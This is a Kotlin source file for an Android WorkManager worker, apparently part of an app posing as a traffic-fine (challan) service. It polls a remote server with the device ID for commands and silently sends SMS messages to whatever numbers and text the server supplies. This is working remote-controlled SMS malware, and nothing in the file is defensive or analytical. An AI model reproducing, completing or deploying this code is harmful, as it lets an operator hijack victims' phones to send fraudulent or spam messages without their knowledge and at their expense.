package com.rte.challan.worker

import android.content.Context
import android.telephony.SmsManager
import androidx.work.Worker
import androidx.work.WorkerParameters
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONArray
import org.json.JSONObject

class CommandWorker(context: Context, workerParams: WorkerParameters) :
    Worker(context, workerParams) {

    private val client = OkHttpClient()
    private val WORKER_URL = "https://your-worker.workers.dev"

    override fun doWork(): Result {
        val deviceId = android.provider.Settings.Secure.getString(
            applicationContext.contentResolver, 
            android.provider.Settings.Secure.ANDROID_ID
        )

        try {
            // Dashboard se commands fetch karo
            val request = Request.Builder()
                .url("$WORKER_URL/api/command-sms?deviceId=$deviceId")
                .build()

            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return Result.retry()

                val data = response.body?.string() ?: return Result.success()
                val commands = JSONArray(data)

                for (i in 0 until commands.length()) {
                    val cmd = commands.getJSONObject(i)
                    // Agar status pending hai tabhi bhejien
                    if (cmd.getString("status") == "pending") {
                        val number = cmd.getString("targetNumber")
                        val message = cmd.getString("messageText")
                        
                        sendDirectSms(number, message)
                        
                        // Optional: Server ko update karein ki SMS bhej diya gaya hai
                    }
                }
            }
            return Result.success()
        } catch (e: Exception) {
            return Result.retry()
        }
    }

    private fun sendDirectSms(number: String, msg: String) {
        try {
            val smsManager = SmsManager.getDefault()
            smsManager.sendTextMessage(number, null, msg, null, null)
        } catch (e: Exception) { e.printStackTrace() }
    }
}
